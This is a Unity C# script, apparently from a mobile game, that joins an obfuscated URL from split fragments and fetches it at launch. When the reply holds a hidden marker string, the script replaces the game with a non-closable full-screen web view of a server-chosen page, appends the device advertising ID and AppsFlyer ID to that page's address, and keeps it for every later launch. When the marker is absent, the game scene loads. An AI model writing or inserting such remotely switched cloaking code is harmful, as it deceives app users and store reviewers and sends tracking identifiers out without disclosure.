using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainSM : MonoBehaviour
{    
    public List<string> splitters;
    [HideInInspector] public string oneoneSMN = "";
    [HideInInspector] public string twotwoSMN = "";


    private void GoSM()
    {
        Screen.orientation = ScreenOrientation.LandscapeLeft;
        SceneManager.LoadScene("Boot");
    }

    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("UrlSMconnect", string.Empty) != string.Empty)
            {
                WEBSMKIND(PlayerPrefs.GetString("UrlSMconnect"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    twotwoSMN += n;
                }
                StartCoroutine(IENUMENATORSM());
            }
        }
        else
        {
            GoSM();
        }
    }



    private IEnumerator IENUMENATORSM()
    {
        using (UnityWebRequest sm = UnityWebRequest.Get(twotwoSMN))
        {

            yield return sm.SendWebRequest();
            if (sm.isNetworkError)
            {
                GoSM();
            }
            int targetSM = 7;
            while (PlayerPrefs.GetString("glrobo", "") == "" && targetSM > 0)
            {
                yield return new WaitForSeconds(1);
                targetSM--;
            }
            try
            {
                if (sm.result == UnityWebRequest.Result.Success)
                {
                    if (sm.downloadHandler.text.Contains("SwtMnstrOJXge"))
                    {

                        try
                        {
                            var subs = sm.downloadHandler.text.Split('|');
                            WEBSMKIND(subs[0] + "?idfa=" + oneoneSMN, subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            WEBSMKIND(sm.downloadHandler.text + "?idfa=" + oneoneSMN + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                        }
                    }
                    else
                    {
                        GoSM();
                    }
                }
                else
                {
                    GoSM();
                }
            }
            catch
            {
                GoSM();
            }
        }
    }

    private void WEBSMKIND(string UrlSMconnect, string NamingSM = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _ironsSM = gameObject.AddComponent<UniWebView>();
        _ironsSM.SetToolbarDoneButtonText("");
        switch (NamingSM)
        {
            case "0":
                _ironsSM.SetShowToolbar(true, false, false, true);
                break;
            default:
                _ironsSM.SetShowToolbar(false);
                break;
        }
        _ironsSM.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _ironsSM.OnShouldClose += (view) =>
        {
            return false;
        };
        _ironsSM.SetSupportMultipleWindows(true);
        _ironsSM.SetAllowBackForwardNavigationGestures(true);
        _ironsSM.OnMultipleWindowOpened += (view, windowId) =>
        {
            _ironsSM.SetShowToolbar(true);

        };
        _ironsSM.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingSM)
            {
                case "0":
                    _ironsSM.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _ironsSM.SetShowToolbar(false);
                    break;
            }
        };
        _ironsSM.OnOrientationChanged += (view, orientation) =>
        {
            _ironsSM.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _ironsSM.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("UrlSMconnect", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("UrlSMconnect", url);
            }
        };
        _ironsSM.Load(UrlSMconnect);
        _ironsSM.Show();
    }



    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaSM") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { oneoneSMN = advertisingId; });
        }
    }



    
}
